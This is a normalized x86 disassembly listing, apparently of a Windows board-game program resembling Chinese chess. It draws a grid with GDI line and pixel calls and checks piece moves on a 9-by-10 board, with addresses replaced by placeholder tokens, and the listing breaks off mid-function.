nop [ eax ] eax
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x88
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xaa
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax edi
push eax
push ebx
call [ LineTo@IAT ]
add edi 0x22
cmp edi 0xee
jle r-xdata
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
mov edi [ LineTo@IAT ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
push [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x44
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
push 0x0
add eax 0xee
push eax
mov eax [ esi * 4 + r--data ]
add eax 0xaa
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x66
push eax
push ebx
call edi
push esi
push 0x2
push 0x7
push ebx
call sub_404a20
push esi
push 0x2
push 0x1
push ebx
call sub_404a20
push esi
push 0x3
push 0x0
push ebx
call sub_404a20
push esi
push 0x3
push 0x2
push ebx
call sub_404a20
add esp 0x40
push esi
push 0x3
push 0x4
push ebx
call sub_404a20
push esi
push 0x3
push 0x6
push ebx
call sub_404a20
push esi
push 0x3
push 0x8
push ebx
call sub_404a20
push esi
push 0x7
push 0x7
push ebx
call sub_404a20
add esp 0x40
push esi
push 0x7
push 0x1
push ebx
call sub_404a20
push esi
push 0x6
push 0x0
push ebx
call sub_404a20
push esi
push 0x6
push 0x2
push ebx
call sub_404a20
push esi
push 0x6
push 0x4
push ebx
call sub_404a20
add esp 0x40
push esi
push 0x6
push 0x6
push ebx
call sub_404a20
push esi
push 0x6
push 0x8
push ebx
call sub_404a20
inc esi
add esp 0x20
cmp esi 0x1
jle r-xdata
push [ ebp + esi * 4 - 0xc ]
push ebx
call [ SelectObject@IAT ]
mov eax [ esi * 4 + r--data ]
push 0x0
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x135
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x113
push eax
push ebx
call edi
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
mov eax [ esi * 4 + r--data ]
sub eax 0x3
push eax
push ebx
call edi
push 0x0
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call [ MoveToEx@IAT ]
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
push [ esi * 4 + r--data ]
push ebx
call edi
mov eax [ esi * 4 + r--data ]
add eax 0x132
push eax
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
mov eax [ esi * 4 + r--data ]
add eax 0x110
push eax
push ebx
call edi
push [ esi * 4 + r--data ]
push [ esi * 4 + r--data ]
push ebx
call edi
mov ecx 0x22
mov [ ebp + 0xc ] ecx
push [ ebp - 0x4 ]
push ebx
call [ SelectObject@IAT ]
push [ ebp - 0xc ]
mov esi [ DeleteObject@IAT ]
call esi
push [ ebp - 0x8 ]
call esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4051e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x34
push ebx
xor ecx ecx
push esi
push edi
mov [ esp + 0x14 ] ecx
cmp [ ebp + 0x10 ] ecx
jle r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
xorps xmm2 xmm2
inc ecx
mov [ esp + 0x14 ] ecx
cmp ecx [ ebp + 0x10 ]
jl r-xdata
movd xmm0 ecx
mov ecx [ ebp + 0x14 ]
mov bx cx
cvtdq2ps xmm0 xmm0
movzx eax cl
mov [ esp + 0x20 ] eax
mov eax ecx
shr bx 0x8
shr eax 0x10
mov [ esp + 0x12 ] bx
mulss xmm0 [ r--data ]
mov [ esp + 0x34 ] eax
movss [ esp + 0x24 ] xmm0
nop
xor edi edi
test eax eax
jle r-xdata
cvtps2pd xmm0 xmm0
movsd [ esp + 0x38 ] xmm0
fld [ esp + 0x38 ]
fldz
call sub_41099a
fstp [ esp + 0x1c ]
movss xmm0 [ esp + 0x1c ]
movss xmm0 [ r--data ]
jmp r-xdata
movss xmm0 [ esp + 0x1c ]
cvtps2pd xmm0 xmm0
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
cvtps2pd xmm0 xmm1
movsd [ esp + 0x28 ] xmm0
fld [ esp + 0x28 ]
call sub_41099a
fstp [ esp + 0x28 ]
movss xmm0 [ esp + 0x28 ]
movss xmm0 [ r--data ]
jmp r-xdata
addss xmm0 [ ebp + 0x24 ]
movd xmm1 [ ebp + 0x18 ]
cvtdq2ps xmm1 xmm1
movss [ esp + 0x28 ] xmm0
addss xmm1 [ esp + 0x24 ]
cvtps2pd xmm0 xmm0
movss [ esp + 0x1c ] xmm1
call sub_410b70
movss xmm1 [ esp + 0x18 ]
cvtps2pd xmm1 xmm1
mulsd xmm0 xmm1
movd xmm1 [ ebp + 0x1c ]
cvtdq2ps xmm1 xmm1
cvtsd2ss xmm0 xmm0
addss xmm0 xmm1
movss [ esp + 0x38 ] xmm0
movss xmm0 [ esp + 0x28 ]
cvtps2pd xmm0 xmm0
call sub_4109b0
movss xmm1 [ esp + 0x18 ]
xorps xmm2 xmm2
cvtps2pd xmm1 xmm1
mov esi [ ebp + 0x14 ]
mulsd xmm0 xmm1
movss xmm1 [ esp + 0x1c ]
mulss xmm1 xmm1
cvtsd2ss xmm2 xmm0
movd xmm0 [ ebp + 0x20 ]
cvtdq2ps xmm0 xmm0
addss xmm2 xmm0
movaps xmm0 xmm2
movss [ esp + 0x28 ] xmm2
mulss xmm0 xmm2
addss xmm1 xmm0
cvtps2pd xmm0 xmm1
call sub_410d40
movss xmm1 [ esp + 0x28 ]
cvtsd2ss xmm0 xmm0
movss [ esp + 0x18 ] xmm0
xorps xmm0 xmm0
ucomiss xmm1 xmm0
lahf
test ah 0x44
jpe r-xdata
mov eax [ ebp + 0x28 ]
mov ecx [ esp + 0x20 ]
cdq
sub eax edx
mov edx 0x0
sar eax 0x1
sub ecx eax
cmovs ecx edx
sub ebx eax
cmovs ebx edx
mov edx [ esp + 0x1c ]
sub edx eax
mov eax 0x0
cmovs edx eax
movzx esi dl
lea eax [ edx - 0x1 ]
cmp eax 0x2
ja r-xdata
movss xmm1 [ esp + 0x38 ]
divss xmm1 [ r--data ]
mov eax [ esp + 0x34 ]
movzx eax al
movzx ebx bl
mov [ esp + 0x1c ] eax
mulss xmm0 [ r--data ]
addss xmm0 xmm1
cvtps2pd xmm0 xmm0
call sub_410b70
movss xmm1 [ esp + 0x18 ]
mov ecx 0xa
mulsd xmm0 [ r--data ]
cvtps2pd xmm1 xmm1
addsd xmm0 xmm1
cvtsd2ss xmm0 xmm0
cvttss2si eax xmm0
cdq
idiv ecx
test edx edx
je r-xdata
movd xmm1 edi
cvtdq2ps xmm1 xmm1
movaps xmm0 xmm1
mulss xmm0 xmm1
addss xmm0 xmm2
cvtps2pd xmm0 xmm0
call sub_410d40
cvtsd2ss xmm0 xmm0
xorps xmm1 xmm1
movss [ esp + 0x18 ] xmm0
movd xmm0 edi
cvtdq2ps xmm0 xmm0
ucomiss xmm0 xmm1
lahf
test ah 0x44
jpe r-xdata
mov ecx [ esp + 0x14 ]
push esi
push [ esp + 0x18 ]
push edi
push [ ebp + 0x8 ]
call [ SetPixel@IAT ]
mov eax [ ebp + 0xc ]
inc edi
mov bx [ esp + 0x12 ]
xorps xmm2 xmm2
cmp edi eax
jl r-xdata
mov edx [ ebp + 0x28 ]
mov eax 0x0
mov ecx [ esp + 0x20 ]
sub ecx edx
cmovs ecx eax
sub ebx edx
cmovs ebx eax
mov eax [ esp + 0x1c ]
sub eax edx
mov edx 0x0
cmovs eax edx
movzx esi al
jmp r-xdata
shl esi 0x8
movzx eax bl
or esi eax
movzx eax cl
shl esi 0x8
or esi eax
sub_4054a0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x14 ]
lea esi [ ebx * 4 + r--data ]
push edi
push esi
call sub_405c30
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebx * 4 + r--data ]
mov ebx [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
mov edx [ ebp + 0x8 ]
jne r-xdata
cmp eax 0x7
jne r-xdata
mov eax [ esi ]
cmp eax 0xd
ja r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ ebx + eax * 4 ]
cmp eax 0x20
je r-xdata
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
jne r-xdata
mov eax [ edi ]
lea ecx [ eax + eax * 2 ]
mov eax [ edi + 0x4 ]
lea eax [ eax + ecx * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_405ba0 ]
cmp [ eax * 4 + r--data ] 0x1
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0xb
jge r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
dec ecx
mov [ rw-data ] ecx
test ecx ecx
jle r-xdata
mov edx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp esi ecx
jg r-xdata
mov edx [ ebp + 0x10 ]
mov ecx [ edi + 0x4 ]
mov esi [ edx + 0x4 ]
cmp ecx esi
jge r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ ecx ]
mov eax esi
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
sub eax [ edi + 0x4 ]
cdq
mov esi eax
mov eax [ edi ]
sub eax [ ecx ]
xor esi edx
sub esi edx
cdq
xor eax edx
sub eax edx
add esi eax
cmp esi 0x1
jle r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ eax + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov esi [ edi + 0x4 ]
mov edx [ ecx + 0x4 ]
cmp edx esi
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
mov esi [ ecx ]
sub eax esi
mov [ ebp - 0xc ] eax
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x4 ] eax
cmp eax 0x1
jne r-xdata
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ eax ]
lea esi [ eax + eax * 2 ]
lea eax [ ecx + esi * 4 ]
lea eax [ edx + eax * 4 ]
nop
mov eax [ edi ]
sub ecx esi
sub eax [ edx ]
cdq
xor eax edx
sub eax edx
add eax ecx
cmp eax 0x1
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
sub eax [ ecx ]
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jle r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
mov esi [ edi ]
mov edi [ eax ]
cmp edi esi
jge r-xdata
mov eax [ eax ]
cmp eax [ edi ]
jne r-xdata
mov edi [ edi ]
lea eax [ edi + edi * 2 ]
lea eax [ esi + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
mov eax [ ecx ]
cmp eax [ edi ]
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ebp + 0xc ] eax
sub eax ecx
mov [ ebp - 0x8 ] eax
cdq
xor eax edx
sub eax edx
cmp eax 0x2
je r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x0
je r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx 0xb
jl r-xdata
lea eax [ ecx + esi * 4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax * 4 + r--data ] 0x7
je r-xdata
dec ecx
sub eax 0x4
mov [ rw-data ] ecx
test ecx ecx
jg r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
add eax esi
cdq
sub eax edx
sar eax 0x1
lea ecx [ eax + eax * 2 ]
mov eax [ ebp + 0xc ]
add eax [ edi + 0x4 ]
cdq
sub eax edx
sar eax 0x1
lea eax [ eax + ecx * 4 ]
cmp [ ebx + eax * 4 ] 0x20
je r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
lea ecx [ edi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
mov eax [ ebp + 0x10 ]
cmp edx esi
jne r-xdata
xor ecx ecx
cmp edx esi
jne r-xdata
cmp edx esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edi eax
mov ecx [ ecx + 0x4 ]
sub edi ecx
mov [ ebp + 0xc ] eax
mov eax edi
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jne r-xdata
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
jge r-xdata
jge r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ eax ]
cmp esi edi
jge r-xdata
jge r-xdata
mov ecx [ ecx ]
cmp ecx edi
jge r-xdata
jmp r-xdata
mov eax esi
sub eax [ ebp - 0x10 ]
cmp eax 0x2
jne r-xdata
inc esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edx
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi ecx
jge r-xdata
inc ecx
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
cmp edi 0x2
jne r-xdata
dec esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
lea eax [ esi + esi * 2 ]
lea eax [ ecx + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ ebp + 0x10 ]
sub edx esi
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
add esi edx
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ebp + 0x10 ]
sub esi edx
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
add edx esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edx
nop [ eax ] eax
lea eax [ edi + edi * 2 ]
sub esi edi
lea eax [ edx + eax * 4 ]
add edi esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edi
nop [ eax + eax ] ax
lea eax [ esi + esi * 2 ]
sub edi esi
lea eax [ edx + eax * 4 ]
add esi edi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop
lea eax [ edi + edi * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax ecx
sub eax [ ebp + 0xc ]
cmp eax 0x2
jne r-xdata
inc ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx edx
jl r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
add eax 0x4
sub edx 0x1
jne r-xdata
inc ecx
add eax 0x4
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub edi 0x1
jne r-xdata
inc ecx
inc esi
add eax 0x4
mov [ rw-data ] esi
cmp esi edx
jl r-xdata
inc edx
add eax 0x4
mov [ rw-data ] edx
cmp edx esi
jl r-xdata
inc edi
add eax 0x30
mov [ rw-data ] edi
cmp edi ecx
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
dec ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_405be0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx 0x84
push esi
push edi
mov esi r--data
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
xor eax eax
nop [ eax ] eax
inc eax
add esi 0x8
cmp eax 0x20
jl r-xdata
lea edx [ ecx + ecx * 2 ]
mov ecx [ esi + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebx + ecx * 4 ] eax
mov ecx [ esi ]
mov [ rw-data ] esi
test ecx ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
pop ebp
retn
sub_405c30
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
cmp edx 0x1
jl r-xdata
xor eax eax
pop ebp
retn
cmp edx 0x9
jg r-xdata
mov ecx [ ecx + 0x4 ]
cmp ecx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax 0xd
ja r-xdata
mov eax 0x1
pop ebp
retn
jmp [ eax * 4 + jump_table_405df0 ]
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x7
jg r-xdata
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x4
jl r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x5
jle r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x6
jge r-xdata
cmp ecx 0x8
jge r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x9
je r-xdata
cmp ecx 0x8
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
and edx 0x80000001
jns r-xdata
cmp ecx 0x3
jle r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x2
je r-xdata
cmp ecx 0x3
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
and edx 0x80000001
jns r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0xa
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x6
je r-xdata
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
xor eax eax
pop ebp
retn
cmp ecx 0x1
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x5
je r-xdata
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
cmp ecx 0x8
cmp edx 0x9
jne r-xdata
cmp ecx 0xa
je r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0x3
jmp r-xdata
cmp edx 0x9
jne r-xdata
cmp ecx 0x1
je r-xdata
jmp r-xdata
cmp ecx 0x6
je r-xdata
je r-xdata
cmp ecx 0x3
jmp r-xdata
cmp ecx 0x5
je r-xdata
sub_405e30
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0xc
mov ecx [ ebp + 0xc ]
xor eax eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
inc eax
cmp eax 0x1f
jle r-xdata
mov edi [ ecx + eax * 8 + 0x4 ]
mov [ rw-data ] edi
cmp eax 0x1f
ja r-xdata
mov ebx [ ecx + eax * 8 ]
mov [ rw-data ] ebx
test ebx ebx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + lookup_table_407528 ]
jmp [ ecx * 4 + jump_table_4074f0 ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0x4 ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
inc edi
cmp edi 0xa
jg r-xdata
mov ebx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ebx + 0x84 ]
mov ebx [ ebx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
inc edi
cmp edi 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ecx + 0x84 ]
mov ebx [ ecx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0x3
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0x5
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
